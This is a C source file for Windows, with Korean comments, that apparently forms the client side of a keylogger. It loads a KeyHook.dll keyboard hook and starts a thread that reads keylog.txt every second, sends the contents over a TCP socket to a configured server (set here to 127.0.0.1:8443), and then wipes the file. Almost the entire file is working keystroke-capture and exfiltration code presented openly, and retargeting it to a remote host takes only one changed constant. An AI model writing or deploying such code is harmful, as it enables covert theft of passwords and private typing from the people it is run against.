#include <Windows.h>
#include <stdio.h>
#include <winsock2.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 8443
#define BUFFER_SIZE 1024

typedef void (*HookFunction)();

void send_log_to_server() {
    SOCKET sock;
    struct sockaddr_in server;
    WSADATA wsa;
    char buffer[BUFFER_SIZE];
    FILE *file;
    size_t bytesRead;

    // Winsock 초기화
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("Failed to initialize Winsock. Error Code: %d\n", WSAGetLastError());
        return;
    }

    // 소켓 생성
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        printf("Socket creation failed. Error Code: %d\n", WSAGetLastError());
        WSACleanup();
        return;
    }

    // 서버 주소 설정
    server.sin_addr.s_addr = inet_addr(SERVER_IP);
    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);

    // 서버 연결 시도
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        printf("Connection to server failed.\n");
        closesocket(sock);
        WSACleanup();
        return;
    }
    printf("Connected to server.\n");

    while (1) {
        // 로그 파일 열기
        file = fopen("keylog.txt", "r");
        if (file == NULL) {
            perror("Failed to open log file.");
            closesocket(sock);
            WSACleanup();
            return;
        }

        // 로그 파일에서 데이터 읽어 서버에 전송
        while ((bytesRead = fread(buffer, 1, sizeof(buffer), file)) > 0) {
            if (send(sock, buffer, bytesRead, 0) < 0) {
                printf("Failed to send data to server.\n");
                fclose(file);
                closesocket(sock);
                WSACleanup();
                return;
            }
        }

        fclose(file);

        // 로그 파일 내용 지우기
        file = fopen("keylog.txt", "w");
        if (file) fclose(file);

        // 1초 간격으로 전송
        Sleep(1000);  // 1초 (1000 밀리초)
    }

    closesocket(sock);
    WSACleanup();
}

int main() {
    // DLL 로드
    HINSTANCE hDll = LoadLibrary(L"KeyHook.dll");
    if (!hDll) {
        printf("Failed to load KeyHook.dll\n");
        return 1;
    }

    // HookStart 함수 포인터 가져오기
    HookFunction HookStart = (HookFunction)GetProcAddress(hDll, "HookStart");
    if (!HookStart) {
        printf("Failed to locate HookStart function\n");
        FreeLibrary(hDll);
        return 1;
    }

    // HookStop 함수 포인터 가져오기
    HookFunction HookStop = (HookFunction)GetProcAddress(hDll, "HookStop");
    if (!HookStop) {
        printf("Failed to locate HookStop function\n");
        FreeLibrary(hDll);
        return 1;
    }

    // 후킹 시작
    HookStart();
    printf("Keyboard hook started. Press any key to stop...\n");

    // 서버로 로그 전송 스레드 시작
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)send_log_to_server, NULL, 0, NULL);

    // 프로그램 종료 전까지 대기
    getchar();

    // 후킹 중지
    HookStop();
    printf("Keyboard hook stopped.\n");

    // DLL 언로드
    FreeLibrary(hDll);
    return 0;
}
